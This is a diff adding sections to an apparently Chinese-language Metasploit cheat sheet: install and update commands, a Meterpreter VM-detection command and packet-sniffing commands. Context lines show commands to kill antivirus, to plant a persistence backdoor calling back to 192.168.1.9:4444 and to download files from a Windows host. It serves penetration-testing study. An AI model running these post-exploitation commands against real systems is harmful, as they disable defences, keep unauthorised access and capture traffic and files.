@@ -10,6 +10,22 @@
 
 ---
 
+## 维护
+**安装**
+
+使用 Rapid7 的一套快速安装项目 metasploit-omnibus,可以实现一句话安装
+```
+curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall && chmod 755 msfinstall && ./msfinstall
+```
+
+**更新**
+
+对于 kali 自带的 msf 可以使用 apt 更新
+```bash
+apt-get update
+apt-get install metasploit-framework
+```
+
 **添加一个新的 exploit**
 
 1. 在 `/usr/share/metasploit-framework/modules/exploits/` 目录下新建一个自定义文件夹 aaatest,将 rb 脚本扔进去
@@ -123,6 +139,12 @@ download <file> <path to save>  # 从 windows 主机下载文件
 ```
 
 ### 其它操作
+
+**环境检测**
+```bash
+run checkvm
+```
+
 **关闭防病毒软件**
 ```bash
 run killav
@@ -216,4 +238,14 @@ run persistence -X -i 10 -r 192.168.1.9 -p 4444
 -i：后门每隔多少秒尝试连接服务端
 -p：服务端监听的端口
 -r：服务端 ip
+```
+
+### 抓包
+
+**sniffer**
+```bash
+use sniffer
+sniffer_interfaces  # 查看网卡信息
+sniffer_start 1 # 开始在序号为1的网卡上抓包
+sniffer_dump 1 xpsp1.cap    # 下载抓取到的数据包
 ```
